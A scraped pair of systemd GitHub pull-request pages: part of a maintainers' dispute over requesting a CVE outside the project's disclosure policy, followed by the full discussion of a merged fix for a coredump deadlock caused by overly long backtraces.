[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326707732)

| Sent to whom?  MITRE  What description?  The place where references to bugs are placed. |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Nov 24, 2022](#issuecomment-1326716134)

| Are you aware of the process defined at <https://github.com/systemd/systemd/security/policy> ? |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326719747)

| I'm aware of that. |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Nov 24, 2022](#issuecomment-1326725146)

| And you decided to ignore it and bypass it because...? |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326758211)

| It's a long story but if you haven't noticed I always report systemd bugs like that publicly. I think it started when I was told that fuzzing stuff shouldn't be sent to that mailing list for some reason. I didn't think it was a good idea but basically when I opened PRs like [#10200](https://github.com/systemd/systemd/pull/10200) all those overflows were immediately public. I didn't request CVEs though because at the time I was able to backport those fixes without that. |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326759492)

| Bugs like [#19584](https://github.com/systemd/systemd/issues/19584) are already public so there is nothing to coordinate anymore. |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Nov 24, 2022](#issuecomment-1326765102)

| Opening github bug reports for issues of any kind is one thing, and most of the times it's fine to do so, especially for the fuzzing stuff. Contacting MITRE to ask for a CVE to be assigned, bypassing the established security process and without consulting anybody else, is very much a different matter altogether. |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 24, 2022](#issuecomment-1326770428)

| especially for the fuzzing stuff  Fuzzing stuff is exactly what should be covered by the security process. When infinite loops like [86b06c6](https://github.com/systemd/systemd/commit/86b06c666be8b7afb45541d35aa4d0ecb38056d1) can be triggered in dhcp-client on receiving some weird packets it should go through that process. And if projects agree I of course participate in CVD. `dbus` is a great example where issues like that are taken seriously: <https://seclists.org/oss-sec/2022/q4/7>  Contacting MITRE to ask for a CVE to be assigned  Well, what else should I do? Let's revisit the policy of not sending fuzzing stuff to that mailing list. I would be more than happy. |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Nov 25, 2022](#issuecomment-1327600595)

| Well, what else should I do?   * contact MITRE again and withdraw the request * if you think something warrants a CVE, follow the process instead of bypassing it, and if there's consensus that a CVE is required *then* you can request one - and if there is not, a ticket on github will have to be enough |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Nov 25, 2022](#issuecomment-1327637033)

| I did contact MITRE and sent links to this thread and [#25518](https://github.com/systemd/systemd/pull/25518) a few hours ago and for now "NOTE: there is some debate about the security relevance of this report because there are zero subscribers by default." ended up in some other CVE. I think it should be fixed soon. I also put use-after-frees, infinite loops and stuff like that that can be triggered remotely on hold because based on [#25518 (comment)](https://github.com/systemd/systemd/pull/25518#issuecomment-1327307923) it seems if a feature like `mdns` happens to be off by default it doesn't matter whether use-after-frees can be triggered on receiving packets when it's on or something like that. I don't agree with that but I don't want to annoy anyone either. |
| --- |

All reactions

Sorry, something went wrong.

[![@evverx](https://avatars.githubusercontent.com/u/10195800?s=80&u=3dddcb9e142b7ac18ef2390a5a8755371ea28f35&v=4)](/evverx)

Copy link

Member

### **[evverx](/evverx)** commented [Dec 23, 2022](#issuecomment-1363668127)

| if there is not, a ticket on github will have to be enough  Having thought about it a bit more I think I'm just going to keep reporting issues publicly but instead of vague bug reports like [#22480](https://github.com/systemd/systemd/issues/22480) I'm just going to be more specific. In that particular case there is a reachable assertion in systemd-resolved that can be triggered by any local user by writing crafted messages to that world-writable socket. Restart doesn't help much obviously because it can be wrapped in a loop (and I frankly have no idea why so much trust is put in "restart" because if stuff is crashed fast enough it gets rate-limited by systemd <https://www.freedesktop.org/software/systemd/man/systemd.unit.html#StartLimitIntervalSec=interval>). I've just checked and Debian Stable still ships resolved where that and a bunch of other local and not-so-local issues are present. The actual Debian security team tracks issues like that (for example [avahi/avahi#338](https://github.com/avahi/avahi/issues/338)). I'm a bit conflicted about being specific about how to trigger various memory corruptions but my understanding is that it should be fine because apparently by the systemd security logic to trigger something in, say, dhcp-server root should enable it somehow so in the end it's downplayed to something requiring user-interaction with the highest privileges so there should be no harm in full public disclosure. |
| --- |

All reactions

Sorry, something went wrong.

[Yamakuzure](/Yamakuzure)
pushed a commit
to elogind/elogind
that referenced
this pull request
[Dec 23, 2022](#ref-commit-0c64328)
[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=40&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering) [![@Yamakuzure](https://avatars.githubusercontent.com/u/1118655?s=40&v=4)](/Yamakuzure)

`[json: explicitly support offsets relative to NULL when dispatching](/elogind/elogind/commit/0c64328a931be02a6dba8d14ebcc8152fda15745 "json: explicitly support offsets relative to NULL when dispatching

Let's trick out UndefinedBehaviourSanitizer:

https://github.com/systemd/systemd/pull/24853#issuecomment-1263380745")`
‚Ä¶

`[0c64328](/elogind/elogind/commit/0c64328a931be02a6dba8d14ebcc8152fda15745)`

```
Let's trick out UndefinedBehaviourSanitizer:

[systemd/systemd#24853 (comment)](https://github.com/systemd/systemd/pull/24853#issuecomment-1263380745)
```

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fpull%2F24853)

Reviewers

[![@surajkrishnan14](https://avatars.githubusercontent.com/u/72937403?s=40&v=4)](/surajkrishnan14) [surajkrishnan14](/surajkrishnan14)

surajkrishnan14 left review comments

[![@yuwata](https://avatars.githubusercontent.com/u/14157143?s=40&v=4)](/yuwata) [yuwata](/yuwata)

yuwata left review comments

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz) [keszybz](/keszybz)

keszybz requested changes

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=40&v=4)](/bluca) [bluca](/bluca)

bluca approved these changes

Assignees

No one assigned

Labels

[resolve](/systemd/systemd/labels/resolve)
[sd-event](/systemd/systemd/labels/sd-event)

Milestone

 [**v252**](/systemd/systemd/milestone/29 "v252")

Development

Successfully merging this pull request may close these issues.

7 participants

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=52&v=4)](/poettering) [![@keszybz](https://avatars.githubusercontent.com/u/349618?s=52&v=4)](/keszybz) [![@bluca](https://avatars.githubusercontent.com/u/782193?s=52&v=4)](/bluca) [![@mrc0mmand](https://avatars.githubusercontent.com/u/679338?s=52&v=4)](/mrc0mmand) [![@evverx](https://avatars.githubusercontent.com/u/10195800?s=52&v=4)](/evverx) [![@yuwata](https://avatars.githubusercontent.com/u/14157143?s=52&v=4)](/yuwata) [![@surajkrishnan14](https://avatars.githubusercontent.com/u/72937403?s=52&v=4)](/surajkrishnan14)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_58235a38_20250114_193414.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fpull%2F25055)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsystemd%2Fsystemd%2Fpull%2F25055)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=systemd%2Fsystemd)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[systemd](/systemd)
/
**[systemd](/systemd/systemd)**
Public

* [Notifications](/login?return_to=%2Fsystemd%2Fsystemd) You must be signed in to change notification settings
* [Fork
  3.9k](/login?return_to=%2Fsystemd%2Fsystemd)
* [Star
   13.6k](/login?return_to=%2Fsystemd%2Fsystemd)

* [Code](/systemd/systemd)
* [Issues
  2.3k](/systemd/systemd/issues)
* [Pull requests
  343](/systemd/systemd/pulls)
* [Actions](/systemd/systemd/actions)
* [Security](/systemd/systemd/security)
* [Insights](/systemd/systemd/pulse)

Additional navigation options

* [Code](/systemd/systemd)
* [Issues](/systemd/systemd/issues)
* [Pull requests](/systemd/systemd/pulls)
* [Actions](/systemd/systemd/actions)
* [Security](/systemd/systemd/security)
* [Insights](/systemd/systemd/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fsystemd%2Fsystemd%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fsystemd%2Fsystemd%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Fix coredump deadlock with overly long backtraces #25055

 Merged

[bluca](/bluca)
merged 3 commits into
[systemd:main](/systemd/systemd/tree/main "systemd/systemd:main")
from
[keszybz:coredump-deadlock](/keszybz/systemd/tree/coredump-deadlock "keszybz/systemd:coredump-deadlock")

Oct 19, 2022

 Merged

# [Fix coredump deadlock with overly long backtraces](#top) #25055

[bluca](/bluca)
merged 3 commits into
[systemd:main](/systemd/systemd/tree/main "systemd/systemd:main")
from
[keszybz:coredump-deadlock](/keszybz/systemd/tree/coredump-deadlock "keszybz/systemd:coredump-deadlock")

Oct 19, 2022

[Conversation
18](/systemd/systemd/pull/25055)
[Commits
3](/systemd/systemd/pull/25055/commits)
[Checks
0](/systemd/systemd/pull/25055/checks)
[Files changed](/systemd/systemd/pull/25055/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![keszybz](https://avatars.githubusercontent.com/u/349618?s=60&v=4)](/keszybz)

Copy link

Member

### @keszybz **[keszybz](/keszybz)** commented [Oct 18, 2022](#issue-1413524236)

 *No description provided.*

Sorry, something went wrong.

All reactions

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)

`[shared/json: allow json_variant_dump() to return an error](/systemd/systemd/pull/25055/commits/7922ead507e0d83e4ec72a8cbd2b67194766e58c "shared/json: allow json_variant_dump() to return an error")`

`[7922ead](/systemd/systemd/pull/25055/commits/7922ead507e0d83e4ec72a8cbd2b67194766e58c)`

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)
[keszybz](/keszybz)
added this to the [v252](/systemd/systemd/milestone/29) milestone
[Oct 18, 2022](#event-7613514488)

[![yuwata](https://avatars.githubusercontent.com/u/14157143?s=60&v=4)](/yuwata)

**[yuwata](/yuwata)**
reviewed
[Oct 18, 2022](#pullrequestreview-1146192985)

 [View reviewed changes](/systemd/systemd/pull/25055/files)

[src/shared/elf-util.c](/systemd/systemd/pull/25055/files#diff-68e05e4a54584d8ec86b222141102762daf72f8bb01176197350f1e5b1f3455d)

Show resolved

Hide resolved

[![yuwata](https://avatars.githubusercontent.com/u/14157143?s=60&v=4)](/yuwata)

**[yuwata](/yuwata)**
approved these changes
[Oct 18, 2022](#pullrequestreview-1146193906)

 [View reviewed changes](/systemd/systemd/pull/25055/files)

[![@yuwata](https://avatars.githubusercontent.com/u/14157143?s=40&u=5898801f54e5dfba212029897cfe7a17f401b4b2&v=4)](/yuwata)
[yuwata](/yuwata)
added
the
[coredump](/systemd/systemd/labels/coredump)
label
[Oct 18, 2022](#event-7613658726)

[![@AdamWill](https://avatars.githubusercontent.com/u/916551?s=80&v=4)](/AdamWill)

Copy link

Contributor

### **[AdamWill](/AdamWill)** commented [Oct 19, 2022](#issuecomment-1283254005)

| so I tried a systemd with this patch on a gnome-calendar crash, and still didn't get a coredump, probably because:  ``` Oct 18 18:24:21 fedora systemd[1]: Started systemd-coredump@0-2842-0.service - Process Core Dump (PID 2842/UID 0). .... Oct 18 18:29:21 fedora systemd[1]: systemd-coredump@0-2842-0.service: Service reached runtime time limit. Stopping. Oct 18 18:29:21 fedora systemd[1]: systemd-coredump@0-2842-0.service: Failed with result 'timeout'.  ```  so it took over five minutes to deal with the core dump, and timed out... |
| --- |

All reactions

Sorry, something went wrong.

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=80&v=4)](/keszybz)

Copy link

Member

Author

### **[keszybz](/keszybz)** commented [Oct 19, 2022](#issuecomment-1283498975) ‚Ä¢ edited Loading

| so I tried a systemd with this patch on a gnome-calendar crash, and still didn't get a coredump, probably because: Oct 18 18:29:21 fedora systemd[1]: systemd-coredump@0-2842-0.service: Failed with result 'timeout'.  On my machine, generating the crash takes 5 seconds. So if it timed out, either something is wrong with the patch, or it wasn't applied properly, or there's some other bug. I'll test my patch again here.  Edit: yeah, it seems to work fine here.  ``` $ journalctl -b _PID=2667772 -o cat | head  Process 2667524 (3) of user 1000 dumped core.  Module linux-vdso.so.1 with build-id b21929a49b68b52a4059932eb797eb7182e48f08 Module libopensc.so.8 with build-id 7e70dbbc60cc7358472bcd2a198f1d548af8ab62 Metadata for module libopensc.so.8 owned by FDO found: { 	"type" : "rpm", 	"name" : "opensc", 	"version" : "0.22.0-7.fc37", 	"architecture" : "x86_64", 	"osCpe" : "cpe:/o:fedoraproject:fedora:37" $ journalctl -b _PID=2667772 -o cat | wc  -c 69644 ``` |
| --- |

All reactions

Sorry, something went wrong.

 [![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)
[keszybz](/keszybz)
[force-pushed](/systemd/systemd/compare/37cd36aa11b6a209c1c6ee1bcebeb87526961773..1d89509b734eaba97341f71da265b0a4bdc75cfe)
the
coredump-deadlock

branch
2 times, most recently
from
[`37cd36a`](/systemd/systemd/commit/37cd36aa11b6a209c1c6ee1bcebeb87526961773) to
[`1d89509`](/systemd/systemd/commit/1d89509b734eaba97341f71da265b0a4bdc75cfe)  [Compare](/systemd/systemd/compare/37cd36aa11b6a209c1c6ee1bcebeb87526961773..1d89509b734eaba97341f71da265b0a4bdc75cfe)
[October 19, 2022 07:21](#event-7618524608)

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=80&v=4)](/keszybz)

Copy link

Member

Author

### **[keszybz](/keszybz)** commented [Oct 19, 2022](#issuecomment-1283548590)

| ```  Assertion 'f = fmemopen_unlocked((void*) "", 0, "r")' failed at src/test/test-json.c:351, function test_json_parse_file_empty(). Aborting.  ```  I'm not sure why this fails. It works for me locally and reading the man page, it should work. I changed it to open `/dev/null` instead. |
| --- |

All reactions

Sorry, something went wrong.

[![@yuwata](https://avatars.githubusercontent.com/u/14157143?s=40&u=5898801f54e5dfba212029897cfe7a17f401b4b2&v=4)](/yuwata)
[yuwata](/yuwata)
added
the
[good-to-merge/waiting-for-ci üëç](/systemd/systemd/labels/good-to-merge/waiting-for-ci%20%F0%9F%91%8D)
PR is good to merge, but CI hasn't passed at time of review. Please merge if you see CI has passed
label
[Oct 19, 2022](#event-7618613392)

 [keszybz](/keszybz)
added 2 commits
[October 19, 2022 09:46](#commits-pushed-87a16eb)

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)

`[shared/json: use different return code for empty input](/systemd/systemd/pull/25055/commits/87a16eb8b54002a49f12944fc09ce45d0cbadf45 "shared/json: use different return code for empty input

It is useful to distinguish if json_parse_file() got no input or invalid input.
Use different return codes for the two cases.")`
 ‚Ä¶

`[87a16eb](/systemd/systemd/pull/25055/commits/87a16eb8b54002a49f12944fc09ce45d0cbadf45)`

```
It is useful to distinguish if json_parse_file() got no input or invalid input.
Use different return codes for the two cases.
```

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)

`[coredump: avoid deadlock when passing processed backtrace data](/systemd/systemd/pull/25055/commits/076b807be472630692c5348c60d0c2b7b28ad437 "coredump: avoid deadlock when passing processed backtrace data

We would deadlock when passing the data back from the forked-off process that
was doing backtrace generation back to the coredump parent. This is because we
fork the child and wait for it to exit. The child tries to write too much data
to the output pipe, and and after the first 64k blocks on the parent because
the pipe is full. The bug surfaced in Fedora because of a combination of four
factors:
- 87707784c70dc9894ec613df0a6e75e732a362a3 was backported to v251.5, which
  allowed coredump processing to be successful.
- 1a0281a3ebf4f8c16d40aa9e63103f16cd23bb2a was NOT backported, so the output
  was very verbose.
- Fedora has the ELF package metadata available, so a lot of output can be
  generated. Most other distros just don't have the information.
- gnome-calendar crashes and has a bazillion modules and 69596 bytes of output
  are generated for it.

Fixes https://bugzilla.redhat.com/show_bug.cgi?id=2135778.

The code is changed to try to write data opportunistically. If we get partial
information, that is still logged. In is generally better to log partial
backtrace information than nothing at all.")`
 ‚Ä¶

`[076b807](/systemd/systemd/pull/25055/commits/076b807be472630692c5348c60d0c2b7b28ad437)`

```
We would deadlock when passing the data back from the forked-off process that
was doing backtrace generation back to the coredump parent. This is because we
fork the child and wait for it to exit. The child tries to write too much data
to the output pipe, and and after the first 64k blocks on the parent because
the pipe is full. The bug surfaced in Fedora because of a combination of four
factors:
- [8770778](https://github.com/keszybz/systemd/commit/87707784c70dc9894ec613df0a6e75e732a362a3) was backported to v251.5, which
  allowed coredump processing to be successful.
- [1a0281a](https://github.com/keszybz/systemd/commit/1a0281a3ebf4f8c16d40aa9e63103f16cd23bb2a) was NOT backported, so the output
  was very verbose.
- Fedora has the ELF package metadata available, so a lot of output can be
  generated. Most other distros just don't have the information.
- gnome-calendar crashes and has a bazillion modules and 69596 bytes of output
  are generated for it.

Fixes <https://bugzilla.redhat.com/show_bug.cgi?id=2135778>.

The code is changed to try to write data opportunistically. If we get partial
information, that is still logged. In is generally better to log partial
backtrace information than nothing at all.
```

 [![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)
[keszybz](/keszybz)
[force-pushed](/systemd/systemd/compare/1d89509b734eaba97341f71da265b0a4bdc75cfe..076b807be472630692c5348c60d0c2b7b28ad437)
the
coredump-deadlock

branch
from
[`1d89509`](/systemd/systemd/commit/1d89509b734eaba97341f71da265b0a4bdc75cfe) to
[`076b807`](/systemd/systemd/commit/076b807be472630692c5348c60d0c2b7b28ad437)  [Compare](/systemd/systemd/compare/1d89509b734eaba97341f71da265b0a4bdc75cfe..076b807be472630692c5348c60d0c2b7b28ad437)
[October 19, 2022 07:47](#event-7618722856)

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=80&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)

Copy link

Member

### **[poettering](/poettering)** commented [Oct 19, 2022](#issuecomment-1283610982)

| Hmm, usually when reading output from a child we wait for EOF on that before waiting for the exit code of the child. Here it is done the other way round, which is the bug, no? |
| --- |

All reactions

Sorry, something went wrong.

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=80&v=4)](/keszybz)

Copy link

Member

Author

### **[keszybz](/keszybz)** commented [Oct 19, 2022](#issuecomment-1283669511)

| Hmm, usually when reading output from a child we wait for EOF on that before waiting for the exit code of the child. Here it is done the other way round, which is the bug, no?  I considered that too. We could read and accumulate input from the child until EOF. But that'd make the receiving side more complicated, because it'd need to grow a buffer, do a loop, and so on. But realistically, I don't think this is useful. The child generates the whole string first, so it knows how big it is, and can size the pipe appropriately. And also, the output should not be arbitrarily long. After all, we're going to stuff this in the journal, and we don't want to put a million lines in the message. So a more generic transfer mechanism would be more complicated but it wouldn't really give us any gains. |
| --- |

All reactions

Sorry, something went wrong.

[![bluca](https://avatars.githubusercontent.com/u/782193?s=60&v=4)](/bluca)

**[bluca](/bluca)**
approved these changes
[Oct 19, 2022](#pullrequestreview-1147199508)

 [View reviewed changes](/systemd/systemd/pull/25055/files/076b807be472630692c5348c60d0c2b7b28ad437)

[![@mrc0mmand](https://avatars.githubusercontent.com/u/679338?s=80&u=299d005fa00f8703202117668c2934027ba1a29a&v=4)](/mrc0mmand)

Copy link

Member

### **[mrc0mmand](/mrc0mmand)** commented [Oct 19, 2022](#issuecomment-1283764079)

| The C8S fail is unrelated ([#25060](https://github.com/systemd/systemd/pull/25060)). |
| --- |

All reactions

Sorry, something went wrong.

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=80&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)

Copy link

Member

### **[poettering](/poettering)** commented [Oct 19, 2022](#issuecomment-1283782951)

| hmm, one question: maybe the transfer mechanism should not actually be a pipe, but a memfd? a memfd can auto-grow and we wouldn't be subject to pipe size limits? i.e. instead of a pipe, just allocate a memfd, and pass it to the child? child writes its stuff there. afterwards we seek back to the front and read it?  I think the code would be more robust and even simpler? |
| --- |

All reactions

Sorry, something went wrong.

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=80&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)

Copy link

Member

### **[poettering](/poettering)** commented [Oct 19, 2022](#issuecomment-1283783426)

| memfd are 3.17 stuff, which is older than our recommended baseline, hence I think that would be Ok to simply use? |
| --- |

All reactions

Sorry, something went wrong.

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=80&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)

Copy link

Member

### **[poettering](/poettering)** commented [Oct 19, 2022](#issuecomment-1283784821) ‚Ä¢ edited Loading

| memfd are just memory that is accounted like other memory, so it's generally a good idea to use, since less special than pipes |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Oct 19, 2022](#issuecomment-1283790149)

| hmm, one question: maybe the transfer mechanism should not actually be a pipe, but a memfd? a memfd can auto-grow and we wouldn't be subject to pipe size limits? i.e. instead of a pipe, just allocate a memfd, and pass it to the child? child writes its stuff there. afterwards we seek back to the front and read it?  I think the code would be more robust and even simpler?  Probably best to leave that for the next release, and just fix the bug as-is for 252? It's a different model, so there is inherent risk of introducing new regressions by changing over |
| --- |

All reactions

Sorry, something went wrong.

[![@poettering](https://avatars.githubusercontent.com/u/2130732?s=80&u=150ad61e1e2802b6b0ef8636e5f6a466ffb1dd5f&v=4)](/poettering)

Copy link

Member

### **[poettering](/poettering)** commented [Oct 19, 2022](#issuecomment-1283799845)

| dunno i think switching this to memfds will remove the entire category of bug here, instead of just trying to massage it to not happen anymore. |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=80&v=4)](/bluca)

Copy link

Member

### **[bluca](/bluca)** commented [Oct 19, 2022](#issuecomment-1283804172)

| dunno i think switching this to memfds will remove the entire category of bug here, instead of just trying to massage it to not happen anymore.  Yes, but it could introduce new bugs that we aren't aware of - post-rc2 is late, surely it can wait a couple of weeks till after the next release? |
| --- |

All reactions

Sorry, something went wrong.

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=80&v=4)](/keszybz)

Copy link

Member

Author

### **[keszybz](/keszybz)** commented [Oct 19, 2022](#issuecomment-1283879400)

| Centos CI (CentOS Stream 8) is TEST-15-DROPIN, i.e. [#25060](https://github.com/systemd/systemd/pull/25060). Not related.  Yes, but it could introduce new bugs that we aren't aware of - post-rc2 is late, surely it can wait a couple of weeks till after the next release?  Yep. I think we should merge this. Memfd might be nicer, but it'll likely touch a lot of code and has higher potential for regressions. |
| --- |

All reactions

Sorry, something went wrong.

[![@bluca](https://avatars.githubusercontent.com/u/782193?s=40&v=4)](/bluca)
[bluca](/bluca)
merged commit [`875c0bd`](/systemd/systemd/commit/875c0bd07eac652c584d858f0a7811ca83b6c6ed)
into
systemd:main

[Oct 19, 2022](https://github.com/systemd/systemd/pull/25055#event-7620999242)

 [![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)
[keszybz](/keszybz)
deleted the
coredump-deadlock

branch
[October 19, 2022 12:21](#event-7621000043)

[![@keszybz](https://avatars.githubusercontent.com/u/349618?s=40&v=4)](/keszybz)
[keszybz](/keszybz)
removed
the
[good-to-merge/waiting-for-ci üëç](/systemd/systemd/labels/good-to-merge/waiting-for-ci%20%F0%9F%91%8D)
PR is good to merge, but CI hasn't passed at time of review. Please merge if you see CI has passed
label
[Oct 19, 2022](#event-7621000801)

[![@AdamWill](https://avatars.githubusercontent.com/u/916551?s=80&v=4)](/AdamWill)

Copy link

Contributor

